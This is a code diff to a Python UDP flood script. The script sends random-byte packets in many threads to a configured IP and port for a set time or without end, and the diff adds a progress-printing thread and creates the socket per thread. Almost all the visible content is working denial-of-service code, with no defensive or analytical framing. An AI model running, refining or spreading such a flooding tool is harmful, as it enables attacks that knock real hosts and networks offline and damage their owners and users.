@@ -4,10 +4,7 @@ import time
 import socket
 import random
 from threading import Thread
-from datetime import datetime
 
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 config = {
     'duration': 5,  # seconds
@@ -22,8 +19,21 @@ config = {
 }
 
 
+def printer():
+    begin = int(config['begin'])
+    last_packets_sent_counter = 0
+    while True:
+        if config['total_packets_sent'] > last_packets_sent_counter:
+            print('[{} SECS] Sent {} packets and {} bytes'.format(int(time.time() - begin),
+                                                                  config['total_packets_sent'],
+                                                                  config['total_bytes_sent']))
+            last_packets_sent_counter = config['total_packets_sent']
+        time.sleep(float(config['timeout']))
+
+
 def start():
     try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         while config['duration'] == 'inf' or config['begin'] + int(config['duration']) > time.time():
             try:
                 sock.sendto(random._urandom(int(config['packet-len'])), (config['ip'], int(config['port'])))
@@ -31,18 +41,13 @@ def start():
                 continue
             config['total_packets_sent'] += 1
             config['total_bytes_sent'] += int(config['packet-len'])
-            print('[{time_went} SECS] Sent {packets} packets to {ip}:{port}. Bytes sent: {total_packets_len}'.format(
-                                                                        packets=config['total_packets_sent'],
-                                                                        ip=config['ip'],
-                                                                        port=config['port'],
-                                                                        total_packets_len=config['total_bytes_sent'],
-                                                                        time_went=int(time.time() - config['begin'])))
-            time.sleep(int(config['timeout']))
+
+            time.sleep(float(config['timeout']))
     except BrokenPipeError:
         print('[ERROR] Router has closed the connection')
 
     else:
-        print('Timeout has been reached')
+        print('[TIMEOUT] Timeout has been reached')
 
     os.abort()
 
@@ -63,6 +68,8 @@ if __name__ == '__main__':
     try:
         config['begin'] = time.time()
 
+        Thread(target=printer).start()
+
         threads = []
 
         for _ in range(int(config['threads'])):
@@ -70,6 +77,7 @@ if __name__ == '__main__':
 
         for thread in threads:
             thread.start()
+
     except KeyboardInterrupt:
         print('\nQuit')
         os.abort()
